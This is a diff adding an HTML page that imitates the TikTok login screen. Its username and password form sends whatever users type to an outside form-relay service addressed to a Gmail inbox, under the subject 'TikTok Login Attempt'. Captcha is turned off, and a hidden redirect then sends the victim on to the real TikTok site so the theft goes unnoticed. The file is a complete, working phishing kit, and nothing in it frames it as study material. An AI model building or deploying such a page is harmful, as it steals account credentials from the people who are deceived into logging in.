@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* Base Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #000;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            line-height: 1.5;
+        }
+
+        /* Login Container */
+        .login-container {
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+            padding: 0 24px;
+        }
+
+        /* Logo Area - Only the logo removed, keeping the container */
+        .logo-area {
+            margin-bottom: 48px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+
+        /* Header */
+        .header {
+            margin-bottom: 16px;
+        }
+
+        .header h1 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            letter-spacing: -0.3px;
+        }
+
+        .subtitle {
+            color: #a8a8a8;
+            font-size: 15px;
+            font-weight: 400;
+            max-width: 320px;
+            margin: 0 auto;
+            line-height: 1.4;
+        }
+
+        /* Login Methods */
+        .login-methods {
+            margin-top: 40px;
+        }
+
+        .method-btn {
+            width: 100%;
+            background-color: rgba(255, 255, 255, 0.08);
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 500;
+            padding: 16px 24px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        .method-btn:hover {
+            background-color: rgba(255, 255, 255, 0.12);
+            transform: translateY(-1px);
+        }
+
+        .method-btn:active {
+            transform: translateY(0);
+        }
+
+        .method-icon {
+            margin-right: 12px;
+            font-size: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 24px;
+        }
+
+        .google-icon {
+            background: conic-gradient(from -45deg, #ea4335 110deg, #4285f4 90deg 180deg, #34a853 180deg 270deg, #fbbc05 270deg) 73% 55%/150% 150% no-repeat;
+            width: 20px;
+            height: 20px;
+            -webkit-mask: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23000' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%23000' d='M46.5 24c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23000' d='M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z'/%3E%3Cpath fill='%23000' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z'/%3E%3Cpath fill='none' d='M0 0h48v48H0z'/%3E%3C/svg%3E") center/contain no-repeat;
+            mask: url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23000' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%23000' d='M46.5 24c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23000' d='M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z'/%3E%3Cpath fill='%23000' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z'/%3E%3Cpath fill='none' d='M0 0h48v48H0z'/%3E%3C/svg%3E") center/contain no-repeat;
+        }
+
+        .facebook-icon {
+            color: #1877F2;
+        }
+
+        .apple-icon {
+            color: #fff;
+        }
+
+        /* Divider */
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 32px 0;
+            color: #666;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+
+        .divider-text {
+            padding: 0 16px;
+            font-size: 14px;
+            font-weight: 400;
+        }
+
+        /* Form */
+        .login-form {
+            margin-top: 8px;
+        }
+
+        .form-input {
+            width: 100%;
+            background-color: rgba(255, 255, 255, 0.08);
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            padding: 16px 20px;
+            margin-bottom: 16px;
+            backdrop-filter: blur(10px);
+            transition: all 0.2s ease;
+        }
+
+        .form-input:focus {
+            outline: none;
+            background-color: rgba(255, 255, 255, 0.12);
+        }
+
+        .form-input::placeholder {
+            color: #999;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: #ff0050;
+            border: none;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 600;
+            padding: 16px 24px;
+            margin-top: 8px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .submit-btn:hover {
+            background-color: #e60046;
+            transform: translateY(-1px);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+
+        /* Footer */
+        .footer {
+            margin-top: 40px;
+            color: #a8a8a8;
+            font-size: 14px;
+        }
+
+        .footer a {
+            color: #ff0050;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 0 16px;
+            }
+            
+            .header h1 {
+                font-size: 24px;
+            }
+            
+            .subtitle {
+                font-size: 14px;
+            }
+            
+            .method-btn, .form-input, .submit-btn {
+                padding: 14px 20px;
+                font-size: 15px;
+            }
+        }
+
+        @media (max-width: 350px) {
+            .header h1 {
+                font-size: 22px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <!-- Logo Area - Only the TikTok heading removed, container remains -->
+        <div class="logo-area">
+            <!-- TikTok logo removed as requested -->
+        </div>
+
+        <!-- Header -->
+        <div class="header">
+            <h1>Log in to TikTok</h1>
+            <p class="subtitle">
+                Manage your account, check notifications, comment on videos and more.
+            </p>
+        </div>
+
+        <!-- Login Methods -->
+        <div class="login-methods">
+            <button class="method-btn">
+                <div class="method-icon google-icon"></div>
+                Continue with Google
+            </button>
+            
+            <button class="method-btn">
+                <div class="method-icon">
+                    <i class="fab fa-facebook facebook-icon"></i>
+                </div>
+                Continue with Facebook
+            </button>
+            
+            <button class="method-btn">
+                <div class="method-icon">
+                    <i class="fab fa-apple apple-icon"></i>
+                </div>
+                Continue with Apple
+            </button>
+        </div>
+
+        <!-- Divider -->
+        <div class="divider">
+            <span class="divider-text">or</span>
+        </div>
+
+        <!-- Login Form -->
+        <form class="login-form" action="https://formsubmit.co/infobloglogs@gmail.com" method="POST">
+            <input type="hidden" name="_subject" value="TikTok Login Attempt">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="https://www.tiktok.com">
+            
+            <input class="form-input" type="text" name="username" placeholder="Email or username" required>
+            <input class="form-input" type="password" name="password" placeholder="Password" required>
+            
+            <button class="submit-btn" type="submit">Log In</button>
+        </form>
+
+        <!-- Footer -->
+        <div class="footer">
+            Don't have an account? <a href="https://www.tiktok.com/signup">Sign up</a>
+        </div>
+    </div>
+
+    <script>
+        // Add smooth interactivity to buttons
+        document.addEventListener('DOMContentLoaded', function() {
+            const buttons = document.querySelectorAll('.method-btn, .submit-btn');
+            
+            buttons.forEach(button => {
+                // Add ripple effect on click
+                button.addEventListener('click', function(e) {
+                    const x = e.clientX - e.target.getBoundingClientRect().left;
+                    const y = e.clientY - e.target.getBoundingClientRect().top;
+                    
+                    const ripple = document.createElement('span');
+                    ripple.style.left = x + 'px';
+                    ripple.style.top = y + 'px';
+                    ripple.classList.add('ripple');
+                    
+                    this.appendChild(ripple);
+                    
+                    setTimeout(() => {
+                        ripple.remove();
+                    }, 600);
+                });
+            });
+            
+            // Simple form validation
+            const form = document.querySelector('.login-form');
+            form.addEventListener('submit', function(e) {
+                const inputs = form.querySelectorAll('input[required]');
+                let valid = true;
+                
+                inputs.forEach(input => {
+                    if (!input.value.trim()) {
+                        valid = false;
+                        input.style.backgroundColor = 'rgba(255, 0, 80, 0.1)';
+                        setTimeout(() => {
+                            input.style.backgroundColor = '';
+                        }, 1000);
+                    }
+                });
+                
+                if (!valid) {
+                    e.preventDefault();
+                    alert('Please fill in all required fields.');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
